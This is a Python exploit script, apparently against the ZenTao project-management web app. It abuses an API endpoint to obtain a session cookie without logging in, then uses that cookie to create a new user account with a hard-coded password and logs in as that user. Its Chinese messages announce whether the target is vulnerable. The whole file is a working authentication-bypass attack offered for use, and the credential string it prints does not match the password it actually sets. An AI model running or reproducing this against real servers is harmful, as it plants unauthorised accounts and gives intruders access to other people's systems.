#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"}

def verify_userpass(site):
    session_url =  site + "/api-getSessionID.json"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15", "Connection": "close", "Accept-Encoding": "gzip"}
    r1 = requests.get(session_url, headers=burp0_headers, verify=False)
    if r1.status_code == 200:
        session_id = json.loads(json.loads(r1.text)["data"])["sessionID"]
        login_url = site + "/user-login-"+session_id+"=.json?account=usertest&password=Apple@@Web11Kit"
        r2 = requests.get(login_url, headers=burp0_headers, verify=False)
        if r2.status_code == 200:
            return r2.text
    return ""



def verify(site):
    burp0_url = site + "/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=iwvpxtinanxkdbepbhnf&branch=swypdmgsqbunltuccwou"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15", "Connection": "close", "Accept-Encoding": "gzip"}
    r1 = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if r1.status_code == 200:
        burp2_url = site + "/api.php/v1/users"
        burp0_headers["Cookie"] = r1.headers["Set-Cookie"]
        data = {"account": "usertest", "password": "Apple@@Web11Kit", "realname": "测试用户"}
        r2 = requests.post(burp2_url, data=data, headers=burp0_headers, verify=False)
        if "error" not in r2.json() or ("error" in r2.json()  and  r2.json()["error"] != "Unauthorized"):
            return "usertest:Apple&&Web11Kit"
    return ""


    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，新用户创建成功，账号密码为：", info)
        login_info = verify_userpass(target)
        if login_info != "":
            print("[+]使用该账号密码认证后的用户信息为：", login_info)
    else:
        print("[-]漏洞不存在")
